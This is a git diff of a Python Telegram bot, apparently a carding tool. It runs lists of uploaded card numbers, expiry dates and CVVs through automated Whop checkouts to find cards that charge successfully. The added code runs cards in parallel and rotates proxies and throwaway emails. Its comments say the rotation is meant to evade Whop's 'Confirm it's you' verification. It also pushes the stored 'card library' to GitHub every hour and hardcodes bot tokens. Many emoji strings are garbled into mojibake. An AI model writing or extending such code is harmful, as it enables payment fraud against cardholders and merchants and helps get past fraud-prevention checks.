@@ -1,10 +1,10 @@
-"""
-telegram_bot.py  —  Whop checker, Telegram front-end
+﻿"""
+telegram_bot.py  ΓÇö  Whop checker, Telegram front-end
 Commands:
-  /start            greeting + buttons (incl. 📊 Database)
+  /start            greeting + buttons (incl. ≡ƒôè Database)
   /ccs              add up to 50 cards  (num|mm|yyyy|cvv, one per line)
   /proxy            list proxy sources
-  /addproxy         add your own proxy  (user:pass@host:port) — tested before saving
+  /addproxy         add your own proxy  (user:pass@host:port) ΓÇö tested before saving
   /whop [url]       run the check (asks: system proxies / add own)
   /live             retry the insufficient cards from the last run
   /db               show the database (which cards actually worked on Whop)
@@ -19,7 +19,7 @@ import re
 import threading
 import time
 import requests
-from concurrent.futures import ThreadPoolExecutor, wait
+from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
 
 import telebot
 from telebot import types
@@ -31,44 +31,132 @@ _ah.CONNECT_TIMEOUT = 90
 
 import whop_bot as W
 import final_bot as F
-from final_bot import BUY_VIP_URL
 
 # token from env (Railway) with a fallback (repo is private, so not leaked).
 # Prefer setting BOT_TOKEN in Railway env and removing this fallback.
-TOKEN = os.environ.get("BOT_TOKEN", "8831100897:AAFu6XD1NyPhOxfHfPhnQDLRdulIBGbXPs8")
+TOKEN = os.environ.get("BOT_TOKEN", "8831100897:AAEIfWzUZEUqgfB-1oi4wB7XRVn0-g9krB0")
 bot = telebot.TeleBot(TOKEN, threaded=True)
 
 DB_FILE = "db.json"
 _lock = threading.RLock()
 _db = None
 
+# ===== persistent data dir (survives restarts from any cwd) =====
+_BASE = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.path.join(_BASE, "data")
+os.makedirs(DATA_DIR, exist_ok=True)
+DB_FILE = os.path.join(DATA_DIR, "db.json")
+
 DEFAULT_CHECKOUT = "https://whop.com/checkout/2onbgwXn2utmOapDAl-sTbB-xhGu-BQo9-ppzjRbOKz1Pc/"
 
 
 # ---------- database ----------
+# Per-user isolation: each chat_id gets its OWN cards / proxies / results.
+# Only system proxies are shared. This keeps 10+ users from mixing data.
 def _default_db():
     return {
-        "ccs": [],            # {number,exp_month,exp_year,cvc,raw,status,live,response,proxy,ts}
-        "proxies_user": [],   # list of "user:pass@host:port" strings (tested OK)
-        "proxies_system": [], # list of "user:pass@host:port" strings
-        "last_run": [],       # {raw,status,proxy,response}
-        "settings": {"checkout_url": DEFAULT_CHECKOUT},
+        "proxies_system": [],  # list of "user:pass@host:port" strings (global)
+        "users": {},           # chat_id -> {ccs, proxies_user, last_run, settings}
     }
+
+
+def user_db(chat_id):
+    """Return (creating if needed) this chat's isolated data bucket."""
+    db = get_db()
+    uid = str(chat_id)
+    u = db["users"].get(uid)
+    if u is None:
+        u = {"ccs": [], "proxies_user": [], "last_run": [],
+             "settings": {"checkout_url": DEFAULT_CHECKOUT}}
+        db["users"][uid] = u
+        save_db()
+    u.setdefault("ccs", [])
+    u.setdefault("proxies_user", [])
+    u.setdefault("last_run", [])
+    u.setdefault("settings", {"checkout_url": DEFAULT_CHECKOUT})
+    return u
+
+
+
+def _remote_repo():
+    """'owner/repo' parsed from `git remote get-url origin` for GH_TOKEN auth
+    URL fallbacks; falls back to the known repo."""
+    import subprocess
+    try:
+        r = subprocess.run(["git", "-C", _BASE, "remote", "get-url", "origin"],
+                           capture_output=True, text=True, timeout=20)
+        u = (r.stdout or "").strip()
+        if "github.com/" in u:
+            return u.split("github.com/", 1)[1].replace(".git", "").rstrip("/")
+    except Exception:
+        pass
+    return "ayaninza/whop-hitter-bot"
+
+
+def _restore_db_file():
+    """If data/db.json is missing, pull the last backed-up copy from the
+    origin 'db-backup' branch so a fresh clone/deploy never loses the card
+    library. Uses the machine's cached git credentials or GH_TOKEN."""
+    import subprocess
+    if os.path.exists(DB_FILE):
+        return
+    env = dict(os.environ)
+    env["GIT_TERMINAL_PROMPT"] = "0"
+    try:
+        r = subprocess.run(["git", "-C", _BASE, "rev-parse", "--is-inside-work-tree"],
+                           capture_output=True, text=True, timeout=20)
+        if r.returncode != 0:
+            return
+        f = subprocess.run(["git", "-C", _BASE, "fetch", "origin", "db-backup"],
+                           capture_output=True, text=True, timeout=120, env=env)
+        if f.returncode != 0 and os.environ.get("GH_TOKEN"):
+            tok = os.environ["GH_TOKEN"]
+            auth = f"https://x-access-token:{tok}@github.com/{_remote_repo()}.git"
+            f = subprocess.run(["git", "-C", _BASE, "fetch", auth,
+                                "db-backup:refs/remotes/origin/db-backup"],
+                               capture_output=True, text=True, timeout=120, env=env)
+        if f.returncode != 0:
+            print("[db] no db-backup branch fetchable yet", flush=True)
+            return
+        s = subprocess.run(["git", "-C", _BASE, "show",
+                            "refs/remotes/origin/db-backup:data/db.json"],
+                           capture_output=True, text=True, timeout=60)
+        if s.returncode == 0 and s.stdout:
+            os.makedirs(DATA_DIR, exist_ok=True)
+            with io.open(DB_FILE, "w", encoding="utf-8") as fh:
+                fh.write(s.stdout)
+            print("[db] restored data/db.json from db-backup branch", flush=True)
+    except Exception as e:
+        print(f"[db] restore failed: {e!r}", flush=True)
 
 
 def load_db():
     global _db
     with _lock:
         if _db is None:
+            _restore_db_file()
+            # migrate an old cwd-based db.json into the persistent data dir
+            legacy = os.path.join(os.getcwd(), "db.json")
+            if not os.path.exists(DB_FILE) and os.path.exists(legacy):
+                try:
+                    os.replace(legacy, DB_FILE)
+                    print(f"[db] migrated {legacy} -> {DB_FILE}", flush=True)
+                except Exception:
+                    pass
             if os.path.exists(DB_FILE):
                 try:
-                    _db = json.load(open(DB_FILE))
+                    _db = json.load(io.open(DB_FILE, encoding="utf-8"))
                 except Exception:
                     _db = _default_db()
             else:
                 _db = _default_db()
             for k, v in _default_db().items():
                 _db.setdefault(k, v)
+            # merge any NEW system proxies (so a proxy added to whop_bot.py
+            # shows up even when this machine already has a saved db)
+            for p in W.PROXIES:
+                if p not in _db["proxies_system"]:
+                    _db["proxies_system"].append(p)
             if not _db["proxies_system"]:
                 _db["proxies_system"] = list(W.PROXIES)
                 save_db()
@@ -78,12 +166,67 @@ def load_db():
 def save_db():
     with _lock:
         tmp = DB_FILE + ".tmp"
-        json.dump(_db, open(tmp, "w"), indent=2)
+        json.dump(_db, io.open(tmp, "w", encoding="utf-8"), indent=2)
         os.replace(tmp, DB_FILE)
 
 
 def get_db():
     return _db if _db is not None else load_db()
+
+
+# ---------- hourly GitHub backup (never lose the card library) ----------
+def _backup_library():
+    """Commit the data/ folder (db.json + emails) to GitHub and push. Uses the
+    machine's cached git credentials, or GH_TOKEN env var as a fallback. Fails
+    silently on network issues — the loop retries next hour."""
+    import subprocess
+    save_db()
+    stamp = time.strftime("%Y-%m-%d %H:%M")
+    try:
+        subprocess.run(["git", "-C", _BASE, "add", "-f", "data"],
+                       capture_output=True, text=True, timeout=60)
+        staged = subprocess.run(
+            ["git", "-C", _BASE, "diff", "--cached", "--quiet", "--", "data"],
+            capture_output=True, text=True, timeout=30).returncode
+        if staged == 0:
+            print("[backup] no changes to commit", flush=True)
+            return
+        cm = subprocess.run(
+            ["git", "-C", _BASE, "commit", "-m", f"auto-backup db ({stamp})",
+             "--", "data"],
+            capture_output=True, text=True, timeout=60)
+        print("[backup] commit:", (cm.stdout + cm.stderr).strip()[-200:], flush=True)
+        refspec = "HEAD:refs/heads/db-backup"
+        ph = subprocess.run(["git", "-C", _BASE, "push", "origin", refspec],
+                            capture_output=True, text=True, timeout=180)
+        if ph.returncode != 0 and os.environ.get("GH_TOKEN"):
+            tok = os.environ["GH_TOKEN"]
+            auth_url = f"https://x-access-token:{tok}@github.com/{_remote_repo()}.git"
+            ph = subprocess.run(["git", "-C", _BASE, "push", auth_url, refspec],
+                                capture_output=True, text=True, timeout=180)
+        if ph.returncode == 0:
+            print("[backup] pushed branch db-backup OK", flush=True)
+        if ph.returncode == 0:
+            print("[backup] pushed to GitHub OK", flush=True)
+        else:
+            print("[backup] push failed:",
+                  (ph.stdout + ph.stderr).strip()[-300:], flush=True)
+    except Exception as e:
+        print(f"[backup] error: {e!r}", flush=True)
+
+
+def auto_backup_loop():
+    """Background thread: after a short delay, then every hour, save db.json
+    and push the data/ folder to GitHub so a restart/wipe can never lose it."""
+    minutes = max(5, int(os.environ.get("BACKUP_MINUTES", "60")))
+    delay = max(5, float(os.environ.get("BACKUP_DELAY_S", "30")))
+    time.sleep(delay)
+    while True:
+        try:
+            _backup_library()
+        except Exception as e:
+            print(f"[backup loop] {e!r}", flush=True)
+        time.sleep(minutes * 60)
 
 
 def cmd_args(m):
@@ -129,47 +272,125 @@ def system_proxies():
     return [proxy_str_to_pw(p) for p in get_db()["proxies_system"]]
 
 
-def user_proxies():
-    return [proxy_str_to_pw(p) for p in get_db()["proxies_user"]]
+def user_proxies(chat_id=None):
+    if not chat_id:
+        return []
+    return [proxy_str_to_pw(p) for p in user_db(chat_id)["proxies_user"]]
 
 
-def all_proxies():
-    return system_proxies() + user_proxies()
+def all_proxies(chat_id=None):
+    return system_proxies() + user_proxies(chat_id)
 
 
 def test_proxy(s):
-    """Return (ok, detail). Tests reachability of whop.com through the proxy."""
+    """Return (ok, detail). Tests reachability of whop.com through the proxy.
+
+    Rejects proxies that need auth (a 407 Proxy-Auth-Required answers, which
+    is < 500, so the old check wrongly passed them) or are IP-blocked."""
     pstr = s if "://" in s else "http://" + s
     proxies = {"http": pstr, "https": pstr}
     try:
         r = requests.get("https://whop.com", proxies=proxies, timeout=15,
                          headers={"User-Agent": "Mozilla/5.0"})
-        if r.status_code < 500:
-            return True, f"HTTP {r.status_code}"
-        return False, f"bad HTTP {r.status_code}"
+        if r.status_code >= 400:
+            return False, (f"HTTP {r.status_code} ΓÇö proxy likely needs auth "
+                           f"(add as user:pass@host:port) or your IP isn't allowlisted")
+        return True, f"HTTP {r.status_code}"
     except Exception as e:
-        return False, str(e)[:100]
+        return False, str(e)[:120]
+
+
+def load_failed(res):
+    """True when the browser never got past page-load (goto timeout, form not
+    mounted, 'Get access' not found) OR Whop showed the "Confirm it's you" OTP
+    gate. Either way NO charge happened, so it is safe to retry that card on a
+    FRESH proxy + FRESH email (a new device identity won't get the OTP). We
+    deliberately exclude post-submit outcomes (declined / unclear / watchdog)
+    where a charge may have already occurred ΓÇö never retry those."""
+    if res.get("status") != "error":
+        return False
+    r = (res.get("response") or "").lower()
+    if "watchdog" in r:
+        return False
+    markers = ("could not load", "checkout form did not load", "could not click",
+               "navigating to", "timeout", "timed out", "exceeded", "goto",
+               "proxy connection", "timeouterror",
+               "verification required", "confirm its you", "confirm it's you",
+               "enter the code", "we sent a code", "saved information",
+               "logging in as", "device will be remembered", "verification code")
+    return any(m in r for m in markers)
+
+
+# Email consumption: one real email per checkout try, removed from the list so
+# it's never reused (reusing a registered email is what triggers Whop's
+# "Confirm it's you" OTP). Invalid/malformed lines are dropped too.
+EMAIL_DB = os.environ.get("EMAIL_DB", os.path.join(DATA_DIR, "emails.txt"))
+_email_lock = threading.Lock()
+_EMAIL_RE = re.compile(r"^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$")
+_used_emails = set()
+
+
+def consume_email():
+    """Return the next unused email from EMAIL_DB (removing it + any invalid
+    lines from the file, thread-safe). Falls back to a fresh random email if
+    the file is missing/empty so the deployed bot still works."""
+    with _email_lock:
+        chosen = None
+        keep = []
+        try:
+            with open(EMAIL_DB, "r", encoding="utf-8", errors="ignore") as f:
+                lines = [ln.strip() for ln in f]
+        except Exception:
+            lines = []
+        for ln in lines:
+            if not ln:
+                continue
+            if chosen is None and _EMAIL_RE.match(ln):
+                chosen = ln
+            else:
+                keep.append(ln)
+        if chosen is not None:
+            try:
+                with open(EMAIL_DB, "w", encoding="utf-8") as f:
+                    f.write("\n".join(keep) + ("\n" if keep else ""))
+            except Exception:
+                pass
+    if chosen:
+        return chosen
+    # file empty/missing -> random fallback (guaranteed unique in-process)
+    for _ in range(50):
+        e = W.random_email()
+        if e not in _used_emails:
+            _used_emails.add(e)
+            return e
+    e = W.random_email()
+    _used_emails.add(e)
+    return e
+
+
+def fresh_email():
+    return consume_email()
 
 
 def add_proxies_tested(chat_id, text):
-    db = get_db()
+    udb = user_db(chat_id)
     lines = [l.strip() for l in text.splitlines() if l.strip()]
     if not lines:
-        bot.send_message(chat_id, "⚠️ no proxy provided")
+        bot.send_message(chat_id, "ΓÜá∩╕Å no proxy provided")
         return 0
-    msg = bot.send_message(chat_id, "╭─ 🔍 *TESTING PROXIES*\n└─ in progress…")
+    msg = bot.send_message(chat_id, "Γò¡ΓöÇ ≡ƒöì *TESTING PROXIES*\nΓööΓöÇ in progressΓÇª")
     added = 0
     report = []
     for l in lines:
         ok, detail = test_proxy(l)
         if ok:
             with _lock:
-                if l not in db["proxies_user"]:
-                    db["proxies_user"].append(l)
+                if l not in udb["proxies_user"]:
+                    udb["proxies_user"].append(l)
                     added += 1
-            report.append(f"├─ ✅ `{l}`  ({detail})")
+            report.append(f"Γö£ΓöÇ Γ£à `{l}`  ({detail})")
         else:
-            report.append(f"├─ ⛔ `{l}`  — {detail}")
+            report.append(f"Γö£ΓöÇ Γ¢ö `{l}`  ΓÇö {detail}")
         try:
             bot.edit_message_text("\n".join(report), chat_id, msg.message_id,
                                   parse_mode="Markdown")
@@ -178,8 +399,8 @@ def add_proxies_tested(chat_id, text):
     save_db()
     try:
         bot.edit_message_text(
-            "╭─ 🔍 *PROXY TEST RESULTS*\n" + "\n".join(report) +
-            f"\n└─ ✅ added {added} · your total {len(db['proxies_user'])}",
+            "Γò¡ΓöÇ ≡ƒöì *PROXY TEST RESULTS*\n" + "\n".join(report) +
+            f"\nΓööΓöÇ Γ£à added {added} ┬╖ your total {len(udb['proxies_user'])}",
             chat_id, msg.message_id, parse_mode="Markdown")
     except Exception:
         pass
@@ -190,34 +411,35 @@ def fmt_box(res):
     s = res["status"]
     last4 = res["last4"]
     proxy = (res.get("proxy") or "").replace("http://", "").replace("https://", "")
+    email = res.get("email") or "? no email"
     if s == "success":
-        head, body, foot = ("✅ 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝",
-                            "├─ 💰 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲",
-                            "╰─ Access granted — saved to ✅ CARDS THAT WORKED.")
+        head, body = "PAYMENT APPROVED", "Charged Successfully"
+        foot = "Access granted - saved to CARDS THAT WORKED."
+    elif s == "stopped":
+        head, body = "STOPPED", "Checkout aborted by user"
+        foot = "No result recorded."
     elif s == "insufficient":
-        head, body, foot = ("❌ 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝",
-                            "├─ 💸 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬",
-                            "╰─ Please add funds or use another payment method.")
+        head, body = "INSUFFICIENT FUNDS", "Not enough balance on this card"
+        foot = "Use /live to retry after adding funds."
     elif s == "declined":
-        head, body, foot = ("❌ 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝",
-                            "├─ 🚫 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐛𝐲 𝐈𝐬𝐬𝐮𝐞𝐫",
-                            "╰─ Please use a different payment method.")
+        head, body = "CARD DECLINED", "Card declined by issuer"
+        foot = "Use a different payment method."
     elif s == "missing":
-        head, body, foot = ("⚠️ 𝐈𝐧𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞",
-                            "├─ 📝 𝐌𝐢𝐬𝐬𝐢𝐧𝐠 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝 𝐅𝐢𝐞𝐥𝐝𝐬",
-                            "╰─ Verify card details and retry.")
+        head, body = "MISSING / INVALID DETAILS", "Missing or invalid required fields"
+        foot = "Verify card details and retry."
     else:  # error
         reason = (res.get("response") or "unknown error").strip().splitlines()[-1][:60]
-        head, body, foot = ("💥 𝐂𝐡𝐞𝐜𝐤 𝐄𝐫𝐫𝐨𝐫",
-                            f"├─ ⚠️ {reason}",
-                            "╰─ Check logs or retry with /live.")
-    return (f"╭─ {head}\n"
-            f"│\n"
-            f"├─ 💳 𝐂𝐚𝐫𝐝 •••• {last4}\n"
-            f"{body}\n"
-            f"├─ 🌐 𝐏𝐫𝐨𝐱𝐲 {proxy}\n"
-            f"│\n"
-            f"{foot}")
+        head, body = "CHECK FAILED", reason
+        foot = "Check logs or retry with /live."
+    return ("| " + head + "\n"
+            "|\n"
+            "| Card ..... : .... " + last4 + "\n"
+            "| Email .... : " + email + "\n"
+            "| " + body + "\n"
+            "| Status ... : " + s.upper() + "\n"
+            "| Proxy .... : " + (proxy or "-") + "\n"
+            "|\n"
+            "| " + foot)
 
 
 def send_result(chat_id, res):
@@ -226,7 +448,7 @@ def send_result(chat_id, res):
     pin = res["status"] == "success"
     if shot and os.path.exists(shot):
         # Try photo first (renders inline in Telegram), then document as a
-        # fallback. We NEVER pipe the screenshot into any vision/LLM model —
+        # fallback. We NEVER pipe the screenshot into any vision/LLM model ΓÇö
         # it is sent straight to the chat so the user sees it.
         try:
             with open(shot, "rb") as ph:
@@ -248,20 +470,21 @@ def send_result(chat_id, res):
     bot.send_message(chat_id, box)
 
 
-def record_result(cc, res):
-    db = get_db()
+def record_result(chat_id, cc, res):
+    udb = user_db(chat_id)
     with _lock:
-        for c in db["ccs"]:
+        for c in udb["ccs"]:
             if c.get("raw") == cc.get("raw"):
                 c["status"] = res.get("status", "")
                 c["response"] = (res.get("response") or "")[:500]
                 c["proxy"] = res.get("proxy", "")
+                c["email"] = res.get("email", "")
                 c["ts"] = time.time()
                 c["live"] = (res.get("status") == "success")
                 break
-        db["last_run"].append({
+        udb["last_run"].append({
             "raw": cc.get("raw"), "status": res.get("status", ""),
-            "proxy": res.get("proxy", ""),
+            "proxy": res.get("proxy", ""), "email": res.get("email", ""),
             "response": (res.get("response") or "")[:300],
         })
         save_db()
@@ -269,40 +492,42 @@ def record_result(cc, res):
 
 # ---------- the check run ----------
 def run_check(chat_id, url, proxy_list, ccs_override=None):
-    db = get_db()
-    target = ccs_override if ccs_override else db["ccs"]
+    udb = user_db(chat_id)
+    target = ccs_override if ccs_override else udb["ccs"]
     if not target:
-        bot.send_message(chat_id, "⚠️ no cards. add with /ccs first")
+        bot.send_message(chat_id, "ΓÜá∩╕Å no cards. add with /ccs first")
         return
     if not proxy_list:
-        bot.send_message(chat_id, "⚠️ no proxies available")
+        bot.send_message(chat_id, "ΓÜá∩╕Å no proxies available")
         return
 
     n = len(target)
-    icon = {"success": "✅", "insufficient": "⚠️", "declined": "⛔",
-            "missing": "❓", "error": "💥"}
+    icon = {"success": "✓", "stopped": "⏹", "insufficient": "⚠️",
+            "declined": "✖", "missing": "❗", "error": "💥"}
     kb_stop = types.InlineKeyboardMarkup()
-    kb_stop.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop"))
+    kb_stop.add(types.InlineKeyboardButton("≡ƒ¢æ Stop", callback_data="stop"))
 
+    workers = max(1, int(os.environ.get("CHECK_WORKERS", "1")))
     status_msg = bot.send_message(
         chat_id,
-        f"╭─ 🚀 *RUN STARTED*\n"
-        f"│\n"
-        f"├─ 💳 cards    : {n}\n"
-        f"├─ ⚡ workers  : 1\n"
-        f"├─ 🌐 proxies  : {len(proxy_list)}\n"
-        f"└─ progress 0/{n} …",
+        f"Γò¡ΓöÇ ≡ƒÜÇ *RUN STARTED*\n"
+        f"Γöé\n"
+        f"Γö£ΓöÇ ≡ƒÆ│ cards    : {n}\n"
+        f"Γö£ΓöÇ ΓÜí workers  : {workers}\n"
+        f"Γö£ΓöÇ ≡ƒîÉ proxies  : {len(proxy_list)}\n"
+        f"ΓööΓöÇ progress 0/{n} ΓÇª",
         parse_mode="Markdown", reply_markup=kb_stop)
 
     def refresh(lines, done, current=None, stop=True):
-        head = (f"╭─ 🚀 *RUN IN PROGRESS*\n"
-                f"│\n"
-                f"├─ 💳 cards    : {n}\n"
-                f"├─ 🌐 proxies  : {len(proxy_list)}\n"
-                f"└─ progress {done}/{n}\n\n")
+        head = (f"Γò¡ΓöÇ ≡ƒÜÇ *RUN IN PROGRESS*\n"
+                f"Γöé\n"
+                f"Γö£ΓöÇ ≡ƒÆ│ cards    : {n}\n"
+                f"Γö£ΓöÇ ΓÜí workers  : {workers}\n"
+                f"Γö£ΓöÇ ≡ƒîÉ proxies  : {len(proxy_list)}\n"
+                f"ΓööΓöÇ progress {done}/{n}\n\n")
         body = "\n".join(lines)
         if current:
-            body += f"\n⏳ checking `…{current}` …"
+            body += f"\nΓÅ│ checking `ΓÇª{current}` ΓÇª"
         try:
             bot.edit_message_text(head + body, chat_id,
                                   status_msg.message_id, parse_mode="Markdown",
@@ -310,56 +535,117 @@ def run_check(chat_id, url, proxy_list, ccs_override=None):
         except Exception:
             pass
 
-    def run_one(cc, px):
-        try:
-            return W.run_checkout(url, cc, proxy=px, headless=True,
-                                  tag=f"tg_{cc['number'][-4:]}")
-        except Exception as e:
-            import traceback as _tb
-            _tb_text = _tb.format_exc()
-            msg = str(e)
-            if ("TargetClosedError" in type(e).__name__ or "context or browser closed" in msg
-                    or "Executable doesn't exist" in msg):
-                try:
-                    libs = W.chromium_missing_libs()
-                    if libs:
-                        _tb_text += "\n\nCHROMIUM LIB CHECK:\n" + libs
-                except Exception:
-                    pass
-            print("WORKER ERROR:", _tb_text, flush=True)
-            return {"cc": cc["number"], "last4": cc["number"][-4:],
-                    "status": "error", "response": _tb_text,
-                    "screenshot": None, "proxy": px["server"]}
+    def process_card(cc, start_idx):
+        """Check one card, rotating to the next proxy on load-failure only. This
+        runs in its own worker so N cards are checked in parallel."""
+        npx = len(proxy_list) or 1
+        em = ""
+        res = None
+        for k in range(npx):
+            if ABORT.get(chat_id):
+                print(f"ABORT(/whop): card …{cc['number'][-4:]} aborted", flush=True)
+                return cc, {"cc": cc["number"], "last4": cc["number"][-4:],
+                            "status": "stopped", "response": "Stopped by user",
+                            "screenshot": None, "proxy": "", "email": em}
+            px = proxy_list[(start_idx + k) % npx] if proxy_list else None
+            em = fresh_email()   # new email + new proxy each attempt avoids OTP
+            try:
+                with BROWSER_SEM:
+                    res = W.run_checkout(url, cc, proxy=px, headless=True,
+                                         tag=f"tg_{cc['number'][-4:]}", email=em)
+            except Exception as e:
+                import traceback as _tb
+                _tb_text = _tb.format_exc()
+                msg = str(e)
+                if ("TargetClosedError" in type(e).__name__ or "context or browser closed" in msg
+                        or "Executable doesn't exist" in msg):
+                    try:
+                        libs = W.chromium_missing_libs()
+                        if libs:
+                            _tb_text += "\n\nCHROMIUM LIB CHECK:\n" + libs
+                    except Exception:
+                        pass
+                print("WORKER ERROR:", _tb_text, flush=True)
+                res = {"cc": cc["number"], "last4": cc["number"][-4:],
+                       "status": "error", "response": _tb_text,
+                       "screenshot": None, "proxy": (px or {}).get("server"),
+                       "email": em}
+            if not load_failed(res):
+                break
+            print(f"card ΓÇª{cc['number'][-4:]}: load failed on "
+                  f"{(px or {}).get('server')}, trying next proxy", flush=True)
+        return cc, res
 
     results = []
     lines = []
-
     refresh(lines, 0)
-    # one browser at a time (sequential) — stable on small containers,
-    # each result shown live as it completes; per-card watchdog so a hang
-    # can't freeze the rest of the run.
-    ex = ThreadPoolExecutor(max_workers=1)
-    for i, cc in enumerate(target, 1):
+
+    # process `workers` cards at once (parallel browsers). Keep the pool full:
+    # as soon as one card completes we launch the next, so 2+ cards are always
+    # being checked simultaneously. Watchdog bounds a total freeze.
+    ex = ThreadPoolExecutor(max_workers=workers)
+    npx = len(proxy_list) or 1
+    inflight = {}   # future -> card
+    card_i = 0
+    done = 0
+    # A full checkout on a slow proxy can exceed 150s (goto 30s + form waits +
+    # up to ~75s settle + fills), so keep the watchdog generous: we only want to
+    # abandon a card that is genuinely stuck, not one that's merely slow.
+    WATCHDOG = int(os.environ.get("CHECK_WATCHDOG", "240"))
+
+    def launch_next():
+        nonlocal card_i
+        if card_i < n:
+            cc = target[card_i]
+            px0 = proxy_list[card_i % npx]
+            inflight[ex.submit(process_card, cc, card_i % npx)] = (cc, px0)
+            card_i += 1
+
+    while len(inflight) < workers and card_i < n:
+        launch_next()
+
+    while inflight:
         if ABORT.get(chat_id):
-            print(f"ABORT: stopping at {i}/{n}", flush=True)
+            print(f"ABORT: stopping after {done}/{n}", flush=True)
+            for f in list(inflight):
+                f.cancel()
             break
-        refresh(lines, i - 1, current=cc["number"][-4:])
-        px = proxy_list[(i - 1) % len(proxy_list)]
-        fut = ex.submit(run_one, cc, px)
-        try:
-            res = fut.result(timeout=150)
-        except Exception as e:
-            res = {"cc": cc["number"], "last4": cc["number"][-4:],
-                   "status": "error", "response": f"watchdog timeout: {e}",
-                   "screenshot": None, "proxy": px["server"]}
-            print(f"WATCHDOG: card …{cc['number'][-4:]} timed out", flush=True)
-        ABORT.pop(chat_id, None)
-        record_result(cc, res)
-        send_result(chat_id, res)
-        results.append((cc, res))
-        lines.append(f"{icon.get(res['status'],'ℹ️')} `…{res['last4']}` "
-                     f"{res['status'].upper()}")
-        refresh(lines, i)
+        done_futs, not_done = wait(list(inflight), timeout=WATCHDOG,
+                                   return_when=FIRST_COMPLETED)
+        if not done_futs:
+            # total freeze ΓÇö fail the stuck cards so the run can't hang forever
+            for fut in not_done:
+                cc, px0 = inflight.pop(fut)
+                res = {"cc": cc["number"], "last4": cc["number"][-4:],
+                       "status": "error", "response": "watchdog timeout",
+                       "screenshot": None, "proxy": (px0 or {}).get("server", "")}
+                print(f"WATCHDOG: card ΓÇª{cc['number'][-4:]} via "
+                      f"{(px0 or {}).get('server')} timed out", flush=True)
+                done += 1
+                record_result(chat_id, cc, res)
+                send_result(chat_id, res)
+                results.append((cc, res))
+                lines.append(f"{icon.get(res['status'],'Γä╣∩╕Å')} `ΓÇª{res['last4']}` "
+                             f"{res['status'].upper()}")
+                refresh(lines, done)
+                launch_next()
+            continue
+        for fut in done_futs:
+            cc, _px0 = inflight.pop(fut)
+            try:
+                cc, res = fut.result()
+            except Exception as e:
+                res = {"cc": cc["number"], "last4": cc["number"][-4:],
+                       "status": "error", "response": f"worker crash: {e}",
+                       "screenshot": None, "proxy": ""}
+            done += 1
+            record_result(chat_id, cc, res)
+            send_result(chat_id, res)
+            results.append((cc, res))
+            lines.append(f"{icon.get(res['status'],'Γä╣∩╕Å')} `ΓÇª{res['last4']}` "
+                         f"{res['status'].upper()}")
+            refresh(lines, done)
+            launch_next()
     ex.shutdown(wait=False)
     ABORT.pop(chat_id, None)
 
@@ -368,7 +654,7 @@ def run_check(chat_id, url, proxy_list, ccs_override=None):
     dec = sum(1 for _, r in results if r["status"] == "declined")
     err = sum(1 for _, r in results if r["status"] == "error")
     lines.append("")
-    lines.append(f"✦ ✅ {hits} live · ⚠️ {ins} insufficient · 🚫 {dec} declined · "
+    lines.append(f"∑ ✓ {hits} live · ⚠️ {ins} insufficient · ✖ {dec} declined · "
                  f"💥 {err} error")
     if ins:
         lines.append("use /live to retry insufficient")
@@ -380,31 +666,32 @@ def run_ref_flow(chat_id, ccs, proxy_list):
     """Run the buy-vip checkout flow (final_bot) for each card, sequentially,
     sending a result + screenshot to the chat as each finishes."""
     n = len(ccs)
-    db = get_db()
-    checkout_url = db["settings"].get("checkout_url", BUY_VIP_URL)
-    icon = {"success": "✅", "insufficient": "⚠️", "declined": "⛔",
-            "missing": "❓", "error": "💥"}
+    udb = user_db(chat_id)
+    checkout_url = udb["settings"].get("checkout_url")
+    icon = {"success": "✓", "stopped": "⏹", "insufficient": "⚠️",
+            "declined": "✖", "missing": "❗", "error": "💥"}
+    ABORT.pop(chat_id, None)   # fresh run: clear any stale stop flag
     kb_stop = types.InlineKeyboardMarkup()
-    kb_stop.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop"))
+    kb_stop.add(types.InlineKeyboardButton("≡ƒ¢æ Stop", callback_data="stop"))
 
     status_msg = bot.send_message(
         chat_id,
-        f"╭─ 🚀 *REF RUN STARTED* (buy-vip)\n"
-        f"│\n"
-        f"├─ 💳 cards    : {n}\n"
-        f"├─ 🌐 proxies  : {len(proxy_list)}\n"
-        f"└─ progress 0/{n} …",
+        f"Γò¡ΓöÇ ≡ƒÜÇ *REF RUN STARTED* (buy-vip)\n"
+        f"Γöé\n"
+        f"Γö£ΓöÇ ≡ƒÆ│ cards    : {n}\n"
+        f"Γö£ΓöÇ ≡ƒîÉ proxies  : {len(proxy_list)}\n"
+        f"ΓööΓöÇ progress 0/{n} ΓÇª",
         parse_mode="Markdown", reply_markup=kb_stop)
 
     def refresh(done, current=None):
-        head = (f"╭─ 🚀 *REF RUN IN PROGRESS* (buy-vip)\n"
-                f"│\n"
-                f"├─ 💳 cards    : {n}\n"
-                f"├─ 🌐 proxies  : {len(proxy_list)}\n"
-                f"└─ progress {done}/{n}\n\n")
+        head = (f"Γò¡ΓöÇ ≡ƒÜÇ *REF RUN IN PROGRESS* (buy-vip)\n"
+                f"Γöé\n"
+                f"Γö£ΓöÇ ≡ƒÆ│ cards    : {n}\n"
+                f"Γö£ΓöÇ ≡ƒîÉ proxies  : {len(proxy_list)}\n"
+                f"ΓööΓöÇ progress {done}/{n}\n\n")
         body = ""
         if current:
-            body += f"⏳ ref `…{current}` …"
+            body += f"ΓÅ│ ref `ΓÇª{current}` ΓÇª"
         try:
             bot.edit_message_text(head + body, chat_id, status_msg.message_id,
                                   parse_mode="Markdown", reply_markup=kb_stop)
@@ -414,29 +701,60 @@ def run_ref_flow(chat_id, ccs, proxy_list):
     results = []
     lines = []
